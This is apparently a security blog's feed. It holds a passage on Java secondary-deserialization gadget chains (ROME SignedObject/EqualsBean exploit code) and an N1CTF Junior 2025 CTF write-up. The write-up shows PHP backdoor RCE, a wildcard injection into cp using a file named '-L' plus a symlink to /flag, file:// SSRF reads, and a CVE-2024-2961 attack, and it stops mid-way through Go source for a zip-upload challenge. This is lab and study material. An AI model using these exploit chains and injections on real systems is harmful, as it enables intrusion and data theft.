namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPair</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyPairGenerator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">SignedObject</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RomeChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SignedObject</span> signedObject<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token constant">CC6EXP</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">SignedObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250219203551692.png" alt="image-20250219203551692"></p><hr><h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>套公式即可，序列化的过程中就会弹一次计算器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RomeEqualChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SignedObject</span> signedObject<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token constant">CC6EXP</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">SignedObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://stoocea.github.io/post/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html&quot;&gt;https://stoocea.github.io/post/Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3&quot;&gt;https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/javaDeserializeLabs%20writeup/&quot;&gt;https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/javaDeserializeLabs%20writeup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html&quot;&gt;http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;二次反序列化大多数时候是用来&lt;strong&gt;绕过黑名单的限制或不出网利用或者绕过一些&lt;code&gt;loadClass()&lt;/code&gt;不能够加载数组的问题&lt;/strong&gt;，不会作为一条单独且完整的利用链存在，而是作为一个中间节点，用来绕过&lt;/p&gt;
&lt;p&gt;一般来说有这几个常见的利用类：SignedObject、RMIConnector、WrapperConnectionPoolDataSource&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Junior 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/09/N1CTF-Junior-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/09/N1CTF-Junior-2025/</id>
    <published>2025-02-09T05:47:36.000Z</published>
    <updated>2025-02-11T16:42:11.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比隔壁好打（</p><p><del>我要是大一就好了</del></p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210232233018.png" alt="image-20250210232233018"></p><span id="more"></span><hr><h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>ctrl+u找到hint：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//# sourceURL=pen.js</span><span class="token comment">//$cmd = $_REQUEST["__2025.happy.new.year"];</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>传参<code>_[2025.happy.new.year</code></p><p>然后就能 rce</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209135301544.png" alt="image-20250209135301544"></p><p>先读一下 index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 真的这么简单吗</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"__2025.happy.new.year"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>backup&#x2F;keep.txt 和 primary&#x2F;keep.txt 均为空</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209135158525.png" alt="image-20250209135158525"></p><p>接下来要提权，总之先蚁剑以 cmdlinux 连上去，注意到 primary 文件夹有写权限</p><p>进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">UID</span>          PID    <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> /start.shroot           <span class="token number">7</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/bash /start.shroot          <span class="token number">13</span>       <span class="token number">7</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/bash /backup.shroot          <span class="token number">22</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startroot          <span class="token number">23</span>       <span class="token number">7</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 <span class="token function">sleep</span> infinitywww-data      <span class="token number">24</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data      <span class="token number">27</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">129</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">134</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">135</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">136</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">137</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">143</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">147</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">149</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startroot        <span class="token number">1357</span>      <span class="token number">13</span>  <span class="token number">0</span> <span class="token number">14</span>:18 ?        00:00:00 <span class="token function">sleep</span> 15s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;backup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /var/www/html/primary<span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/    <span class="token function">sleep</span> 15s<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里每15秒会把 primary 下的所有文件复制到 backup</p><p><code>cp -P</code>会直接复制整个软链接而不是软链接指向的内容</p><p>尝试在文件名处进行通配符在野注入，参考：<a href="https://www.cnblogs.com/linuxsec/articles/10701392.html">https://www.cnblogs.com/linuxsec/articles/10701392.html</a></p><p>把<code>-L</code>选项注入进去实现复制软链接指向的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token operator">></span><span class="token string">'-L'</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>等待15s后 backup 下出现flag</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210000435855.png" alt="image-20250210000435855"></p><hr><h1 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h1><p>白名单文件上传</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid file type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者任意url</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$image</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$image</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid URL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$avatarPath</span><span class="token punctuation">,</span> <span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试一下 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209152608347.png" alt="image-20250209152608347"></p><p>那么接下来要rce</p><p>测了下发现出网，那尝试写个马</p><p>获取user_id，<code>file:///var/www/db/db.json</code>读取db.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"users"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"befc3c75-5af3-4715-9450-ac69879ddd42"</span><span class="token punctuation">,</span>            <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>            <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"$2y$10$M47\/Bxtr4jlUgyEPCaYWMeOP5UdHyRVJaXySpwHr6el48U6BmsXCm"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件上传的路径有了，接下来的问题是控制后缀，这里是php8，phar寄了</p><p>考虑打CVE-2024-2961，<code>file:///proc/self/maps</code> 取 maps，<code>file:///usr/lib/x86_64-linux-gnu/libc.so.6</code>取 libc.so.6</p><p>然后跑脚本打payload</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209225619027.png" alt="image-20250209225619027"></p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209183432111.png" alt="image-20250209183432111"></p><hr><h1 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"archive/zip"</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"net/http"</span><span class="token string">"os"</span><span class="token string">"path/filepath"</span><span class="token string">"strings"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"github.com/google/uuid"</span><span class="token punctuation">)</span><span class="token keyword">const</span> uploadDir <span class="token operator">=</span> <span class="token string">"./uploads"</span><span class="token keyword">func</span> <span class="token function">unzipSimpleFile</span><span class="token punctuation">(</span>file <span class="token operator">*</span>zip<span class="token punctuation">.</span>File<span class="token punctuation">,</span> filePath <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>outFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> outFile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fileInArchive<span class="token punctuation">,</span> err <span class="token operator">:=</span> file<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> fileInArchive<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>outFile<span class="token punctuation">,</span> fileInArchive<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">unzipFile</span><span class="token punctuation">(</span>zipPath<span class="token punctuation">,</span> destDir <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>zipReader<span class="token punctuation">,</span> err <span class="token operator">:=</span> zip<span class="token punctuation">.</span><span class="token function">OpenReader</span><span class="token punctuation">(</span>zipPath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> zipReader<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> file <span class="token operator">:=</span> <span class="token keyword">range</span> zipReader<span class="token punctuation">.</span>File <span class="token punctuation">&#123;</span>filePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>destDir<span class="token punctuation">,</span> file<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token keyword">if</span> file<span class="token punctuation">.</span><span class="token function">FileInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">Mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>err <span class="token operator">=</span> <span class="token function">unzipSimpleFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> filePath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">randFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">LoadHTMLGlob</span><span class="token punctuation">(</span><span class="token string">"templates/*"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>xForwardedFor <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>xForwardedFor<span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"only localhost can get flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>flag <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token 